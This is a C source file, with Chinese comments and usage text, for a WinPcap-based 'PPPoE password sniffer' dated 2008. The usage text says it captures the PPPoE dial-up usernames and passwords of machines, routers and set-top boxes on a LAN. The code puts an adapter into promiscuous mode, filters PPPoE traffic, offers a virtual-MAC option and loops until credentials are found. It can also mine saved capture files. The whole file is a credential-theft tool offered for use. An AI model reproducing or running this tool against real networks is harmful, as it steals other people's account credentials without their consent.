#include "common.h"

extern bool ShowMsg;
extern char szFileName[MAX_PATH];
extern pcap_t *devicehandle;
extern bool FoundUsrNamePASSWD;
extern bool processFile;
extern bool use_TEST_MAC;
// 使用方法
void usage()
{	
	// 不显示对收到封包的分析过程
	ShowMsg = false;
	// 根据文件名是否包含字串"zpf",来决定使用那个MAC地址
	UseMacByFileName();

	printf("\t\tPPPOE密码嗅探器 v1.0");
	printf("\n    本程序可以嗅探到网络中使用PPPOE拨号的用户名和密码.");
	printf("\n比如(本机或局域网中)xDSL宽带连接,宽带数字电视机顶盒,路由器等保存的帐号密码.");
	printf("\n\t\t\t\t版权 (C) 2008 zhupf (xzfff@126.com).");
	printf("\n使用方法:\t(使用前必须安装[WinPcap],建议4.0.2版)");
	printf("\n\t1.注意文件名,看下方注意事项.当前是: %s",szFileName);
	printf("\n\t2.通过下面的列出的方法运行本程序.");
	printf("\n\t  <1> PPPOE 直接双击运行,选一个网卡后,监听网络");
	printf("\n\t  <2> 分析本地封包文件. 拖动封包文件到程序文件上,");
	printf("\n\t      或命令行: \"%s\" \"file.pcap\".",szFileName);
	printf("\n\t3.打开拨号程序(宽带连接,可以是网络中的某电脑),某个宽带机顶盒或路由器.");
	printf("\n\t  如果直接连接两机,连接机顶盒或连接路由器,须用[双机互联的网线].");
	printf("\n注意: 若文件名包含字串\"zpf\",则嗅探过程使用本机网卡物理地址.");
	printf("\n      否则使用虚拟网卡地址.比较通用,可以获取本机的宽带密码.");
	printf("\n-----------------------------------------------------------------\n");
}

int main(int argc, char **argv)
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
	pcap_t *fp;
	pcap_t *adhandle;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct pcap_pkthdr *header;
	const u_char *pkt_data;
	int inum = 0;
	u_int i=1;
	int res;
	struct tm ltime;
	char timestr[16];
	time_t local_tv_sec;

	// 使用方法
	usage();
	
	if(argc != 2)
	{
		// 获取设备列表
		if(pcap_findalldevs(&alldevs, errbuf) == -1)
		{
			fprintf(stderr,"错误发生于 pcap_findalldevs: %s\n", errbuf);
			return -1;
		}

		// 打印列表
		printf("可用网卡列表:\n");// (通常<1>号网卡不是真实的网卡,可能没作用!)
		for(d=alldevs; d; d=d->next,i++)
		{
			//printf("%d. %s", ++i, d->name);
			if (d->description)
			{
				if (0 == strcmp(d->description,"Adapter for generic dialup and VPN capture"))
				{
					i--;
					continue;
				}
				printf("\t%d. %s\n", i, d->description);
				//printf("\t%d. %s\n", i, d->name);
			}
			else
			{
				printf("\t%d. %s\n", i, d->name);
				//printf(" (No description available)\n");
			}
		}
		i--;
		
		if(i==0)
		{
			printf("\n找不到设备! WinPcap 必须安装.\n");
			return -1;
		}
		printf("要使用第几个(1-%d): ",i);
		
		//------------------------------------
		// 从键盘读取选择的网卡编号
		if (!GetDeviceToUse(inum))
		{
			// 释放设备列表
			pcap_freealldevs(alldevs);
			wait2exit();
		}
		//------------------------------------
		//scanf("%d", &inum);

		if(inum < 1 || inum > static_cast<int>(i))
		{
			inum = (i>1)?0:1;
			GetLoaclMac(inum);
			printf("超出范围,本程序自动选了<%d>号网卡.如果长时间没反应,请重启程序后试其他网卡!\n",inum);
		}
		else
		{
			GetLoaclMac(inum);
		}
		
		// 跳转到所选适配器
		for(d=alldevs, i=1; ; d=d->next, i++)
		{
			if (0 == strcmp(d->description,"Adapter for generic dialup and VPN capture"))
			{
				i--;
				continue;
			}
			if (static_cast<int>(i) >= inum)
			{
				break;
			}
		}
		// 上来就选第二个
		//d=alldevs->next;
    
		// 打开适配器
		if ((adhandle= pcap_open_live(d->name,	// name of the device
								 65536,			// portion of the packet to capture. 
												// 65536 grants that the whole packet will be captured on all the MACs.
								 1,				// promiscuous mode (nonzero means promiscuous)
								 1000,			// read timeout
								 errbuf			// error buffer
								 )) == NULL)
		{
			fprintf(stderr,"\n打不开网卡. WinPcap不支持 %s \n", d->name);
			// 释放设备列表
			pcap_freealldevs(alldevs);
			wait2exit();
			return -1;
		}
		// 打开设备保存到全局,让发送时使用
		devicehandle = adhandle;

		// 检查数据链路层，为了简单，我们只考虑以太网
		if(pcap_datalink(adhandle) != DLT_EN10MB)
		{
			fprintf(stderr,"\n本程序只能工作于以太网络.\n");
			// 释放设备列表
			pcap_freealldevs(alldevs);
			wait2exit();
			return -1;
		}
		
		//------------------------------------
		// 过滤封包,将直接丢弃不是PPPoE的封包
		bpf_u_int32 netmask;
		struct bpf_program fcode;
		if (d->addresses != NULL)
		{
			// 获取接口第一个地址的掩码
			netmask=((struct sockaddr_in *)(d->addresses->netmask))->sin_addr.S_un.S_addr;
		}
		else
		{        
			// 如果这个接口没有地址，那么我们假设这个接口在C类网络中
			netmask=0xffffff; 
		}
		if (pcap_compile(adhandle, &fcode, "ether proto 0x8863 or ether proto 0x8864", 1, netmask) < 0)
		{
			fprintf(stderr,"\n不能编译包过滤器,检查过滤器语法.\n");
			// 释放设备列表
			pcap_freealldevs(alldevs);
			wait2exit();
			return -1;
		}    
		if (pcap_setfilter(adhandle, &fcode) < 0)
		{
			fprintf(stderr,"\n设置过滤器错误.\n");
			// 释放设备列表
			pcap_freealldevs(alldevs);
			wait2exit();
			return -1;
		}
		//------------------------------------

		printf("嗅探器 监听于: %s...\n", d->description);
		// 不需要设备列表时,释放它
		pcap_freealldevs(alldevs);

		// 取得封包
		while((res = pcap_next_ex( adhandle, &header, &pkt_data)) >= 0){
			
			if(res == 0)
				// 超时
				continue;
			
			// 转换时间格式到可读的格式
			if (ShowMsg)
			{
				local_tv_sec = header->ts.tv_sec;
				localtime_s(&ltime, &local_tv_sec);
				strftime( timestr, sizeof timestr, "%H:%M:%S", &ltime);
				printf("\n%s,%.6d len:%d. ", timestr, header->ts.tv_usec, header->len);
			}

			// 处理封包
			ProcessPktdata(pkt_data);

			// 是否已经找到了用户名和密码,是就退出
			if (FoundUsrNamePASSWD)
			{
				printf("\n获得用户名和密码成功!  ");
				break;
			}
		}
		
		if(res == -1){
			printf("读取封包错误: %s\n", pcap_geterr(adhandle));
			wait2exit();
			return -1;
		}
		
	   pcap_close(adhandle);  

	}
	else
	{
		processFile = true;
		// 打开抓包文件
		if ((fp = pcap_open_offline(argv[1],			// name of the device
			errbuf					// error buffer
			)) == NULL)
		{
			fprintf(stderr,"\n打不开文件 %s.\n", argv[1]);
			wait2exit();
			return -1;
		}

		// 检查数据链路层，为了简单，我们只考虑以太网
		if(pcap_datalink(fp) != DLT_EN10MB)
		{
			fprintf(stderr,"\n本程序只能工作于以太网络.\n");
			wait2exit();
			return -1;
		}


		// 从文件取得封包
		while((res = pcap_next_ex(fp, &header, &pkt_data)) >= 0)
		{
			// 打印时间	
			if (ShowMsg)
			{
				local_tv_sec = header->ts.tv_sec;
				localtime_s(&ltime, &local_tv_sec);
				strftime( timestr, sizeof timestr, "%H:%M:%S", &ltime);
				printf("\n%s,%.6d len:%d. ", timestr, header->ts.tv_usec, header->len);
			}

			// 处理从文件中获得的封包
			ProcessPktdata(pkt_data);
			
			// 是否已经找到了用户名和密码,是就退出
			if (FoundUsrNamePASSWD)
			{
				printf("\n获得用户名和密码成功!  ");
				break;
			}
			if (ShowMsg)
			{
				printf("\n\n");	
			}
		}
		
		if (res == -1)
		{
			printf("读取封包错误: %s\n", pcap_geterr(fp));
		}
		
		pcap_close(fp);
	}
	
	wait2exit();
	return 0;
}